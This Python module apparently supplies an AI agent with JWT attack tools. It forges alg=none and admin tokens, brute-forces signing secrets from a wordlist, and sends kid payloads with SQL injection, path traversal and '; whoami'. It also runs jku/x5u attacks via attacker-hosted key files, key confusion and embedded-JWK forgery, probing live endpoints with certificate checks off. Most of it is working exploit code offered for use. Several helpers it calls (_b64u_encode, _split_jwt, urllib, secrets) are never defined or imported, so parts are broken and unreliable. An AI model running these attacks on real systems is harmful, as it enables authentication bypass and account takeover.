"""
JWT (JSON Web Token) Security Scanner and Exploiter

Comprehensive JWT vulnerability testing:
- Algorithm confusion (none, RS256->HS256)
- Weak secret brute-forcing
- kid parameter injection
- jku/x5u header injection
- Key confusion attacks
- Token forgery
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
from typing import Dict, Tuple

import requests

from src.sdk.tool import function_tool

_DEFAULT_HEADERS = {"User-Agent": "Mozilla/5.0 (CyberCoPilot/1.0 JWT-Scanner)"}
_TIMEOUT = 15


def _base64url_decode(data: str) -> bytes:
    """Decode base64url without padding."""
    padding = 4 - (len(data) % 4)
    if padding != 4:
        data += '=' * padding
    return base64.urlsafe_b64decode(data)


def _base64url_encode(data: bytes) -> str:
    """Encode to base64url without padding."""
    return base64.urlsafe_b64encode(data).decode().rstrip('=')


def _parse_jwt(token: str) -> Tuple[Dict, Dict, str]:
    """Parse JWT into header, payload, and signature."""
    try:
        parts = token.split('.')
        if len(parts) != 3:
            raise ValueError("Invalid JWT format")
        
        header = json.loads(_base64url_decode(parts[0]))
        payload = json.loads(_base64url_decode(parts[1]))
        signature = parts[2]
        
        return header, payload, signature
    except Exception as e:
        raise ValueError(f"Failed to parse JWT: {e}")


def _forge_jwt(header: Dict, payload: Dict, secret: str = "", algorithm: str = "") -> str:
    """Forge a JWT with given header and payload."""
    if algorithm:
        header['alg'] = algorithm
    
    header_b64 = _base64url_encode(json.dumps(header, separators=(',', ':')).encode())
    payload_b64 = _base64url_encode(json.dumps(payload, separators=(',', ':')).encode())
    
    unsigned_token = f"{header_b64}.{payload_b64}"
    
    alg = header.get('alg', 'none').upper()
    
    if alg == 'NONE':
        return f"{unsigned_token}."
    elif alg.startswith('HS'):
        if not secret:
            return f"{unsigned_token}."
        
        # HMAC signature
        if alg == 'HS256':
            sig = hmac.new(secret.encode(), unsigned_token.encode(), hashlib.sha256).digest()
        elif alg == 'HS384':
            sig = hmac.new(secret.encode(), unsigned_token.encode(), hashlib.sha384).digest()
        elif alg == 'HS512':
            sig = hmac.new(secret.encode(), unsigned_token.encode(), hashlib.sha512).digest()
        else:
            sig = b''
        
        return f"{unsigned_token}.{_base64url_encode(sig)}"
    else:
        # For RS/ES algorithms, return unsigned (signature verification will fail)
        return f"{unsigned_token}."


@function_tool()
def jwt_attack_scanner(
    token: str,
    attack_types: str = "all",
    wordlist: str = "/usr/share/wordlists/rockyou.txt",
    callback_domain: str = "",
    test_url: str = "",
    test_header: str = "Authorization",
) -> str:
    """
    Comprehensive JWT vulnerability scanner and exploiter.
    
    Tests for:
    1. Algorithm confusion (none, RS256->HS256)
    2. Weak secret brute-forcing
    3. kid parameter injection (SQL injection, path traversal, command injection)
    4. jku header injection (SSRF to attacker-controlled JWK)
    5. x5u header injection (SSRF to attacker-controlled cert)
    6. Key confusion attacks
    7. Token forgery with common secrets
    
    Args:
        token: JWT token to analyze
        attack_types: Comma-separated: none,weak_secret,kid_injection,jku_spoofing,x5u_spoofing,key_confusion,all
        wordlist: Path to wordlist for secret brute-forcing (default: rockyou.txt)
        callback_domain: OAST domain for SSRF detection in jku/x5u attacks
        test_url: Optional URL to test forged tokens against
        test_header: Header name for token (default: Authorization)
    
    Returns:
        JWT vulnerability analysis and exploitation results
    """
    output = ["═══════════════════════════════════════════════════════════",
              "           JWT SECURITY SCANNER & EXPLOITER",
              "═══════════════════════════════════════════════════════════", ""]
    
    findings = []
    
    # Parse token
    try:
        header, payload, signature = _parse_jwt(token)
    except ValueError as e:
        return f"Error: {e}"
    
    output.append("── Token Analysis ─────────────────────────────────────")
    output.append(f"Algorithm: {header.get('alg', 'none')}")
    output.append(f"Type: {header.get('typ', 'JWT')}")
    if 'kid' in header:
        output.append(f"Key ID (kid): {header['kid']}")
    if 'jku' in header:
        output.append(f"JWK Set URL (jku): {header['jku']}")
    if 'x5u' in header:
        output.append(f"X.509 URL (x5u): {header['x5u']}")
    
    output.append(f"\nPayload claims: {list(payload.keys())}")
    if 'sub' in payload:
        output.append(f"  Subject: {payload['sub']}")
    if 'exp' in payload:
        import datetime
        exp_time = datetime.datetime.fromtimestamp(payload['exp'])
        output.append(f"  Expires: {exp_time}")
    if 'iat' in payload:
        import datetime
        iat_time = datetime.datetime.fromtimestamp(payload['iat'])
        output.append(f"  Issued: {iat_time}")
    
    output.append("")
    
    attacks = attack_types.lower().split(',')
    if 'all' in attacks:
        attacks = ['none', 'weak_secret', 'kid_injection', 'jku_spoofing', 'x5u_spoofing', 'key_confusion']
    
    # ══════════════════════════════════════════════════════════════════════
    # Attack 1: Algorithm Confusion (none)
    # ══════════════════════════════════════════════════════════════════════
    if 'none' in attacks:
        output.append("── Attack 1: Algorithm Confusion (none) ───────────────")
        
        # Test 1: alg=none
        forged_none = _forge_jwt(header.copy(), payload, algorithm='none')
        output.append("  Forged token (alg=none):")
        output.append(f"    {forged_none[:80]}...")
        
        if test_url:
            try:
                r = requests.get(test_url, headers={test_header: f"Bearer {forged_none}"},
                                timeout=_TIMEOUT, verify=False)
                if r.status_code == 200:
                    findings.append("CRITICAL → Algorithm confusion (none) successful! "
                                  "Server accepts unsigned tokens.")
                    output.append(f"  ✓ SUCCESS: Server accepted unsigned token (HTTP {r.status_code})")
                else:
                    output.append(f"  ✗ Rejected: HTTP {r.status_code}")
            except Exception as e:
                output.append(f"  ✗ Error: {e}")
        else:
            output.append("  ℹ No test_url provided - manual testing required")
        
        # Test 2: alg=None (case variation)
        forged_none_case = _forge_jwt(header.copy(), payload, algorithm='None')
        output.append("  Forged token (alg=None - case variation):")
        output.append(f"    {forged_none_case[:80]}...")
        
        # Test 3: alg=NONE (uppercase)
        _forge_jwt(header.copy(), payload, algorithm='NONE')
        
        output.append("")
    
    # ══════════════════════════════════════════════════════════════════════
    # Attack 2: Weak Secret Brute-forcing
    # ══════════════════════════════════════════════════════════════════════
    if 'weak_secret' in attacks and header.get('alg', '').startswith('HS'):
        output.append("── Attack 2: Weak Secret Brute-forcing ────────────────")
        
        # Common weak secrets
        common_secrets = [
            "secret", "password", "123456", "admin", "test", "key",
            "jwt", "token", "secret123", "password123", "qwerty",
            "letmein", "changeme", "default", "root", "toor",
        ]
        
        f"{token.rsplit('.', 1)[0]}"
        original_sig = token.rsplit('.', 1)[1]
        
        cracked_secret = None
        
        for secret in common_secrets:
            test_token = _forge_jwt(header, payload, secret=secret)
            test_sig = test_token.rsplit('.', 1)[1]
            
            if test_sig == original_sig:
                cracked_secret = secret
                findings.append(f"CRITICAL → Weak JWT secret cracked: '{secret}'")
                output.append(f"  ✓ CRACKED: Secret is '{secret}'")
                break
        
        if not cracked_secret:
            output.append("  ✗ Common secrets failed. Trying wordlist...")
            
            # Try wordlist (first 1000 lines)
            try:
                import os
                if os.path.exists(wordlist):
                    with open(wordlist, 'r', errors='ignore') as f:
                        for i, line in enumerate(f):
                            if i >= 1000:
                                break
                            secret = line.strip()
                            test_token = _forge_jwt(header, payload, secret=secret)
                            test_sig = test_token.rsplit('.', 1)[1]
                            
                            if test_sig == original_sig:
                                cracked_secret = secret
                                findings.append(f"CRITICAL → JWT secret cracked: '{secret}'")
                                output.append(f"  ✓ CRACKED: Secret is '{secret}' (line {i+1})")
                                break
                    
                    if not cracked_secret:
                        output.append("  ✗ Secret not found in first 1000 lines of wordlist")
                else:
                    output.append(f"  ✗ Wordlist not found: {wordlist}")
            except Exception as e:
                output.append(f"  ✗ Error reading wordlist: {e}")
        
        if cracked_secret:
            output.append("\n  Forged admin token:")
            admin_payload = payload.copy()
            admin_payload['sub'] = 'admin'
            admin_payload['role'] = 'admin'
            admin_payload['admin'] = True
            admin_token = _forge_jwt(header, admin_payload, secret=cracked_secret)
            output.append(f"    {admin_token}")
        
        output.append("")
    
    # ══════════════════════════════════════════════════════════════════════
    # Attack 3: kid Parameter Injection
    # ══════════════════════════════════════════════════════════════════════
    if 'kid_injection' in attacks and 'kid' in header:
        output.append("── Attack 3: kid Parameter Injection ──────────────────")
        
        kid_payloads = [
            # SQL injection
            "' OR '1'='1",
            "' UNION SELECT 'secret'--",
            # Path traversal
            "../../../../../../etc/passwd",
            "../../../../../../dev/null",
            # Command injection
            "; whoami",
            "| whoami",
            # XXE
            "file:///etc/passwd",
        ]
        
        for kid_payload in kid_payloads:
            kid_header = header.copy()
            kid_header['kid'] = kid_payload
            forged = _forge_jwt(kid_header, payload)
            output.append(f"  Testing kid='{kid_payload[:40]}'...")
            
            if test_url:
                try:
                    r = requests.get(test_url, headers={test_header: f"Bearer {forged}"},
                                    timeout=_TIMEOUT, verify=False)
                    if r.status_code == 200:
                        findings.append(f"HIGH → kid injection may be exploitable with payload: {kid_payload}")
                        output.append("    ✓ HTTP 200 - potential vulnerability")
                    elif r.status_code == 500:
                        findings.append(f"MEDIUM → kid injection caused server error: {kid_payload}")
                        output.append("    ⚠ HTTP 500 - server error (possible injection)")
                except Exception as e:
                    output.append(f"    ✗ Error: {e}")
        
        output.append("")
    
    # ══════════════════════════════════════════════════════════════════════
    # Attack 4: jku Header Injection (SSRF)
    # ══════════════════════════════════════════════════════════════════════
    if 'jku_spoofing' in attacks:
        output.append("── Attack 4: jku Header Injection (SSRF) ──────────────")
        
        if callback_domain:
            jku_header = header.copy()
            jku_header['jku'] = f"http://{callback_domain}/jwks.json"
            forged = _forge_jwt(jku_header, payload)
            
            output.append(f"  Injected jku: http://{callback_domain}/jwks.json")
            output.append(f"  Forged token: {forged[:80]}...")
            
            if test_url:
                try:
                    r = requests.get(test_url, headers={test_header: f"Bearer {forged}"},
                                    timeout=_TIMEOUT, verify=False)
                    output.append(f"  Response: HTTP {r.status_code}")
                    output.append(f"  ℹ Check {callback_domain} for SSRF callback")
                except Exception as e:
                    output.append(f"  ✗ Error: {e}")
            else:
                output.append(f"  ℹ No test_url - check {callback_domain} for SSRF callback")
        else:
            output.append("  ℹ No callback_domain provided - skipping SSRF test")
        
        output.append("")
    
    # ══════════════════════════════════════════════════════════════════════
    # Attack 5: x5u Header Injection (SSRF)
    # ══════════════════════════════════════════════════════════════════════
    if 'x5u_spoofing' in attacks:
        output.append("── Attack 5: x5u Header Injection (SSRF) ──────────────")
        
        if callback_domain:
            x5u_header = header.copy()
            x5u_header['x5u'] = f"http://{callback_domain}/cert.pem"
            forged = _forge_jwt(x5u_header, payload)
            
            output.append(f"  Injected x5u: http://{callback_domain}/cert.pem")
            output.append(f"  Forged token: {forged[:80]}...")
            
            if test_url:
                try:
                    r = requests.get(test_url, headers={test_header: f"Bearer {forged}"},
                                    timeout=_TIMEOUT, verify=False)
                    output.append(f"  Response: HTTP {r.status_code}")
                    output.append(f"  ℹ Check {callback_domain} for SSRF callback")
                except Exception as e:
                    output.append(f"  ✗ Error: {e}")
            else:
                output.append(f"  ℹ No test_url - check {callback_domain} for SSRF callback")
        else:
            output.append("  ℹ No callback_domain provided - skipping SSRF test")
        
        output.append("")
    
    # ══════════════════════════════════════════════════════════════════════
    # Attack 6: Key Confusion (RS256 -> HS256)
    # ══════════════════════════════════════════════════════════════════════
    if 'key_confusion' in attacks and header.get('alg', '').startswith('RS') and test_url:
        output.append("── Attack 6: Key Confusion (RS256 -> HS256) ───────────")
        
        # Try to discover public key via JWKS
        parsed_url = urllib.parse.urlparse(test_url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
        
        jwks_paths = [
            "/.well-known/jwks.json", "/api/auth/keys", "/api/public-key",
            "/.well-known/openid-configuration", "/oauth/discovery/keys",
            "/api/v1/auth/jwks.json", "/jwks.json"
        ]
        
        found_key = False
        for path in jwks_paths:
            try:
                jk_url = urllib.parse.urljoin(base_url, path)
                r_jk = requests.get(jk_url, headers=_DEFAULT_HEADERS, timeout=5, verify=False)
                if r_jk.status_code == 200 and ("keys" in r_jk.text or "BEGIN PUBLIC KEY" in r_jk.text):
                    output.append(f"  ✓ Discovered potential public key at: {jk_url}")
                    
                    # Logic to treat public key as secret
                    secret_candidate = r_jk.text.strip()
                    # Attempt forgery
                    confused_token = _forge_jwt(header.copy(), payload, secret=secret_candidate, algorithm='HS256')
                    output.append("  Attempting HS256 forgery with public key as secret...")
                    
                    r_test = requests.get(test_url, headers={test_header: f"Bearer {confused_token}"},
                                        timeout=_TIMEOUT, verify=False)
                    if r_test.status_code == 200:
                        findings.append(f"CRITICAL → Key confusion SUCCESS at {jk_url}!")
                        output.append("  ✓ SUCCESS: Server accepted HS256 token signed with public key!")
                        found_key = True
                        break
                    else:
                        output.append(f"  ✗ Rejected with HS256: HTTP {r_test.status_code}")
            except:
                continue
                
        if not found_key:
            output.append("  ✗ Could not discover public key or server is not vulnerable to RS256->HS256 confusion.")
        output.append("")
    
    # ══════════════════════════════════════════════════════════════════════
    # Summary
    # ══════════════════════════════════════════════════════════════════════
    output.append("═══════════════════════════════════════════════════════════")
    output.append("                      SUMMARY")
    output.append("═══════════════════════════════════════════════════════════")
    
    if findings:
        output.append(f"\n🔴 Found {len(findings)} JWT vulnerabilities:\n")
        for finding in findings:
            output.append(f"  • {finding}")
        
        output.append("\n📋 Remediation:")
        output.append("  1. Use strong, random secrets (256+ bits)")
        output.append("  2. Validate 'alg' header - reject 'none'")
        output.append("  3. Sanitize 'kid' parameter - no user input")
        output.append("  4. Validate 'jku'/'x5u' URLs - whitelist only")
        output.append("  5. Use RS256/ES256 instead of HS256 when possible")
    else:
        output.append("\n✅ No obvious JWT vulnerabilities detected.")
        output.append("   Consider manual testing with jwt_tool.py or jwt.io")
    
    return "\n".join(output)


@function_tool()
def jwt_forge_token(
    original_token: str,
    modifications: str,
    secret: str = "",
    algorithm: str = "",
) -> str:
    """
    Forge a JWT token with custom modifications.
    
    Args:
        original_token: Original JWT to modify
        modifications: JSON string with payload modifications (e.g. '{"sub":"admin","role":"admin"}')
        secret: HMAC secret (required for HS256/384/512)
        algorithm: Override algorithm (e.g. 'none', 'HS256')
    
    Returns:
        Forged JWT token
    """
    try:
        header, payload, _ = _parse_jwt(original_token)
        
        # Apply modifications
        if modifications:
            mods = json.loads(modifications)
            payload.update(mods)
        
        # Forge token
        forged = _forge_jwt(header, payload, secret=secret, algorithm=algorithm)
        
        return f"Forged JWT:\n{forged}\n\nHeader: {json.dumps(header, indent=2)}\nPayload: {json.dumps(payload, indent=2)}"
    
    except Exception as e:
        return f"Error forging token: {e}"


# ─────────────────────────────────────────────────────────────────────────────
# Advanced JWT attacks (header-controlled key resolution)
# ─────────────────────────────────────────────────────────────────────────────

def _generate_rsa_keypair():
    """Generate a fresh RSA keypair so we can sign attacker-controlled JWTs."""
    try:
        from cryptography.hazmat.primitives.asymmetric import rsa
        from cryptography.hazmat.primitives import serialization, hashes
    except ImportError:
        return None, None
    priv = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    pub = priv.public_key()
    return priv, pub


def _public_jwk(pub) -> dict:
    """Serialize an RSA public key into a JWK (RS256-compatible)."""
    nums = pub.public_numbers()
    e_b = nums.e.to_bytes((nums.e.bit_length() + 7) // 8, "big")
    n_b = nums.n.to_bytes((nums.n.bit_length() + 7) // 8, "big")
    return {
        "kty": "RSA",
        "use": "sig",
        "alg": "RS256",
        "kid": "attacker-" + secrets.token_hex(4),
        "n": _b64u_encode(n_b),
        "e": _b64u_encode(e_b),
    }


def _sign_rs256(priv, signing_input: str) -> str:
    from cryptography.hazmat.primitives.asymmetric import padding
    from cryptography.hazmat.primitives import hashes
    sig = priv.sign(signing_input.encode(), padding.PKCS1v15(), hashes.SHA256())
    return _b64u_encode(sig)


def _forge_rs256(priv, header: dict, payload: dict) -> str:
    h_b64 = _b64u_encode(json.dumps(header, separators=(",", ":")).encode())
    p_b64 = _b64u_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h_b64}.{p_b64}"
    sig = _sign_rs256(priv, signing_input)
    return f"{signing_input}.{sig}"


def _probe_token(verify_url: str, forged: str, header_name: str, base_headers: dict) -> str:
    """Send the forged token and decide if it was accepted."""
    if not verify_url:
        return "(no verify_url provided — token not probed)"
    headers = dict(base_headers or {})
    if header_name.lower() == "authorization":
        headers["Authorization"] = f"Bearer {forged}"
    else:
        headers[header_name] = forged
    try:
        r = requests.get(verify_url, headers=headers, timeout=10, verify=False)
    except Exception as e:
        return f"verify error: {e}"
    snippet = (r.text or "")[:200].replace("\n", " ")
    if r.status_code == 200:
        return f"[+] HTTP 200 — token possibly accepted. Body: {snippet}"
    elif r.status_code in (401, 403):
        return f"[-] HTTP {r.status_code} — rejected. {snippet}"
    return f"[?] HTTP {r.status_code}. {snippet}"


# ─────────────────────────────────────────────────────────────────────────────
# jku — fetch JWKS from an attacker-controlled URL
# ─────────────────────────────────────────────────────────────────────────────

@function_tool()
def jwt_jku_attack(
    token: str,
    attacker_jwks_url: str,
    target_claim_overrides: str = "{}",
    verify_url: str = "",
    auth_header: str = "Authorization",
    base_headers: str = "{}",
) -> str:
    """
    Re-sign a JWT with our own RSA key and set `jku` in the header pointing at
    a JWKS file we control. If the validator fetches the JWKS by URL without a
    domain whitelist, the forgery is accepted.

    PRE-REQ: host attacker_jwks_url returning the printed JWKS JSON.

    Args:
        token:                  Original JWT (any algorithm) for header/payload structure
        attacker_jwks_url:      URL where YOU host the printed JWKS (e.g. https://x.burpcollab.net/jwks.json)
        target_claim_overrides: JSON of claims to override (e.g. {"sub":"admin","role":"admin"})
        verify_url:             Endpoint that accepts the JWT — used to probe success
        auth_header:            Header name (Authorization, X-Auth-Token, …)
        base_headers:           JSON of session headers
    """
    try:
        h, p, _ = _split_jwt(token)
    except Exception as e:
        return f"Error parsing token: {e}"
    try:
        overrides = json.loads(target_claim_overrides) if target_claim_overrides else {}
    except Exception:
        overrides = {}
    try:
        bh = json.loads(base_headers) if base_headers else {}
    except Exception:
        bh = {}

    priv, pub = _generate_rsa_keypair()
    if priv is None:
        return "Error: cryptography package required (pip install cryptography)"
    jwk = _public_jwk(pub)

    new_header = {**h, "alg": "RS256", "jku": attacker_jwks_url, "kid": jwk["kid"], "typ": "JWT"}
    new_payload = {**p, **overrides}
    forged = _forge_rs256(priv, new_header, new_payload)

    out = [
        "## JWT jku attack",
        f"Forged token (truncated): {forged[:80]}...",
        f"\n[Host THIS at {attacker_jwks_url}]",
        json.dumps({"keys": [jwk]}, indent=2),
        f"\n[Verify probe → {verify_url or '(skipped)'}]",
        _probe_token(verify_url, forged, auth_header, bh),
    ]
    return "\n".join(out)


# ─────────────────────────────────────────────────────────────────────────────
# x5u — like jku but for X.509 PEM at a URL
# ─────────────────────────────────────────────────────────────────────────────

@function_tool()
def jwt_x5u_attack(
    token: str,
    attacker_cert_url: str,
    target_claim_overrides: str = "{}",
    verify_url: str = "",
    auth_header: str = "Authorization",
    base_headers: str = "{}",
) -> str:
    """
    Same shape as jku but the validator fetches an X.509 cert chain (PEM) from
    `x5u`. Print the PEM you must host — sign with the matching key.

    Args:
        token:                Original JWT
        attacker_cert_url:    URL where you host the PEM cert chain
        target_claim_overrides: JSON claim overrides
        verify_url:           Probe endpoint
        auth_header:          Header carrying the JWT
        base_headers:         Session headers JSON
    """
    try:
        h, p, _ = _split_jwt(token)
    except Exception as e:
        return f"Error parsing token: {e}"

    try:
        from cryptography.hazmat.primitives.asymmetric import rsa
        from cryptography.hazmat.primitives import serialization, hashes
        from cryptography import x509
        from cryptography.x509.oid import NameOID
        import datetime as _dt
    except ImportError:
        return "Error: cryptography package required (pip install cryptography)"

    priv = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    subject = issuer = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "attacker-jwt")])
    cert = (
        x509.CertificateBuilder()
        .subject_name(subject)
        .issuer_name(issuer)
        .public_key(priv.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(_dt.datetime.utcnow())
        .not_valid_after(_dt.datetime.utcnow() + _dt.timedelta(days=365))
        .sign(priv, hashes.SHA256())
    )
    pem = cert.public_bytes(serialization.Encoding.PEM).decode()

    try:
        overrides = json.loads(target_claim_overrides) if target_claim_overrides else {}
        bh = json.loads(base_headers) if base_headers else {}
    except Exception:
        overrides = {}
        bh = {}

    new_header = {**h, "alg": "RS256", "x5u": attacker_cert_url, "typ": "JWT"}
    new_payload = {**p, **overrides}
    forged = _forge_rs256(priv, new_header, new_payload)

    return "\n".join([
        "## JWT x5u attack",
        f"Forged token: {forged[:80]}...",
        f"\n[Host THIS PEM at {attacker_cert_url}]",
        pem,
        "\n[Verify probe]",
        _probe_token(verify_url, forged, auth_header, bh),
    ])


# ─────────────────────────────────────────────────────────────────────────────
# kid — directory traversal / SQLi
# ─────────────────────────────────────────────────────────────────────────────

@function_tool()
def jwt_kid_path_traversal(
    token: str,
    candidate_kids: str = "",
    verify_url: str = "",
    auth_header: str = "Authorization",
    base_headers: str = "{}",
) -> str:
    """
    Forge tokens whose `kid` header points at predictable filesystem paths
    (e.g. /dev/null, /etc/passwd) so the validator HMAC-signs against known
    file contents and we can sign with the same key.

    The classic `kid: ../../../../dev/null` then HS256 with empty key.

    Args:
        token:           Original JWT
        candidate_kids:  Comma-separated kid values to try (defaults: traversal + sqli + null)
        verify_url:      Probe endpoint
        auth_header:     Auth header name
        base_headers:    JSON of session headers
    """
    import hmac
    try:
        h, p, _ = _split_jwt(token)
        bh = json.loads(base_headers) if base_headers else {}
    except Exception as e:
        return f"Error: {e}"

    if not candidate_kids:
        kids = [
            "../../../../../../../dev/null",
            "/dev/null",
            "../../../../../../../etc/hostname",
            "' UNION SELECT 'AAAA'-- ",
            "' OR '1'='1",
            "key1' || (SELECT 'attacker') || '",
            "../../resources/keys/public.pem",
        ]
    else:
        kids = [k.strip() for k in candidate_kids.split(",") if k.strip()]

    out = ["## JWT kid path-traversal / SQLi"]
    for kid in kids:
        # If kid is /dev/null, signing key is empty bytes
        if "dev/null" in kid:
            secret_for_sign = b""
        elif "etc/hostname" in kid or "passwd" in kid:
            # Common content guesses
            secret_for_sign = b"localhost\n"
        else:
            # SQLi case — assume the chosen branch returns a literal string ('AAAA')
            secret_for_sign = b"AAAA"

        new_header = {**h, "alg": "HS256", "kid": kid, "typ": "JWT"}
        h_b = _b64u_encode(json.dumps(new_header, separators=(",", ":")).encode())
        p_b = _b64u_encode(json.dumps(p, separators=(",", ":")).encode())
        msg = f"{h_b}.{p_b}".encode()
        sig = hmac.new(secret_for_sign, msg, hashlib.sha256).digest()
        forged = f"{h_b}.{p_b}.{_b64u_encode(sig)}"
        out.append(f"\n[kid={kid!r}]  token: {forged[:60]}...")
        out.append("    " + _probe_token(verify_url, forged, auth_header, bh))
    return "\n".join(out)


# ─────────────────────────────────────────────────────────────────────────────
# Embedded JWK (RFC 7515 §4.1.3) — header itself contains the key
# ─────────────────────────────────────────────────────────────────────────────

@function_tool()
def jwt_embedded_jwk(
    token: str,
    target_claim_overrides: str = "{}",
    verify_url: str = "",
    auth_header: str = "Authorization",
    base_headers: str = "{}",
) -> str:
    """
    Forge a JWT whose header carries an embedded JWK. Vulnerable validators
    use that key to verify the signature — since we sign with the matching
    private key, the forgery is accepted.

    Args:
        token:                  Original JWT
        target_claim_overrides: JSON claim overrides
        verify_url:             Probe URL
        auth_header:            Auth header
        base_headers:           Session headers JSON
    """
    try:
        h, p, _ = _split_jwt(token)
        overrides = json.loads(target_claim_overrides) if target_claim_overrides else {}
        bh = json.loads(base_headers) if base_headers else {}
    except Exception as e:
        return f"Error: {e}"

    priv, pub = _generate_rsa_keypair()
    if priv is None:
        return "Error: cryptography package required (pip install cryptography)"
    jwk = _public_jwk(pub)

    new_header = {**h, "alg": "RS256", "jwk": jwk, "kid": jwk["kid"], "typ": "JWT"}
    new_payload = {**p, **overrides}
    forged = _forge_rs256(priv, new_header, new_payload)
    return "\n".join([
        "## JWT embedded-jwk attack",
        f"Forged: {forged[:80]}...",
        "[Verify probe] " + _probe_token(verify_url, forged, auth_header, bh),
    ])
